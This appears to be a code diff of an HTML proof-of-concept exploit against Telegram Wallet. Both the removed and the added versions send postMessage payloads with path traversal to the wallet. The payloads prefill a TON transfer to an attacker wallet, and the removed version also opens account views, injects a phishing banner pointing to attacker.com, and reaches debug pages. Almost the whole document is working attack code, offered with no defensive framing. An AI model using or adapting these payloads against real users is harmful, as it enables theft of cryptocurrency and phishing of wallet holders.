@@ -1,73 +1,32 @@
-
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Telegram Wallet Exploit PoC</title>
-  </head>
-  <body>
-    <h1>Telegram Wallet Exploit Demo</h1>
-    <p>This PoC shows how a background attacker page can silently trigger authenticated actions inside Telegram Wallet.</p>
+<head>
+  <title>Telegram Wallet Injection Test</title>
+  <meta charset="UTF-8" />
+</head>
+<body>
+  <h2>🧪 Exploit running...</h2>
+  <p>This PoC opens Telegram Wallet and injects wallet logic using postMessage.</p>
 
-    <!-- Load Telegram Wallet Start Page in Hidden iframe -->
-    <iframe id="tg_frame" src="https://t.me/wallet/start" style="display:none;"></iframe>
+  <script>
+    const popup = window.open("https://web.telegram.org/a/", "_blank");
 
-    <script>
-      const payloads = [
-        // Prefilled TON transfer to attacker
-        "../../../wallet/send?amount=1000000&to=@attacker_wallet",
+    const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
+    const message = JSON.stringify({
+      eventType: 'web_app_open_tg_link',
+      eventData: {
+        path_full: `/wallet/start?x=${encodeURIComponent(payload)}`
+      }
+    });
 
-        // Open accounts view (sensitive info)
-        "../../../wallet/accounts",
-
-        // Inject a fake banner with phishing URL
-        "../../../wallet/start?banner=verify_phone&title=Update+Required&text=Your+TON+Wallet+must+be+verified.+Click+here+to+secure+it.&url=https://attacker.com",
-
-        // Load TON Space
-        "../../../wallet/ton-space",
-
-        // Debug info (for dev interfaces)
-        "../../../wallet/debug"
-      ];
-
-      let index = 0;
-
-      const sendPayload = () => {
-        const testPayload = payloads[index];
-        console.log("🚀 Sending payload:", testPayload);
-
-        const message = JSON.stringify({
-          eventType: 'web_app_open_tg_link',
-          eventData: {
-            path_full: `/wallet/start?x=${encodeURIComponent(testPayload)}`
-          }
-        });
-
-        const iframe = document.getElementById("tg_frame");
-
-        if (iframe && iframe.contentWindow) {
-          iframe.contentWindow.postMessage(message, "*");
-        } else {
-          console.warn("⚠️ iframe not ready or blocked.");
-        }
-
-        index++;
-        if (index < payloads.length) {
-          setTimeout(sendPayload, 2500); // Wait 2.5s between each
-        }
-      };
-
-      window.onload = function () {
-        const iframe = document.getElementById("tg_frame");
-
-        iframe.onload = function () {
-          console.log("✅ iframe loaded");
-          sendPayload();
-        };
-
-        iframe.onerror = function () {
-          console.error("❌ iframe failed to load");
-        };
-      };
-    </script>
-  </body>
+    setTimeout(() => {
+      if (popup) {
+        popup.postMessage(message, "*");
+        console.log("✅ Payload sent to Telegram Wallet");
+      } else {
+        console.warn("❌ Popup failed to open.");
+      }
+    }, 1500);
+  </script>
+</body>
 </html>
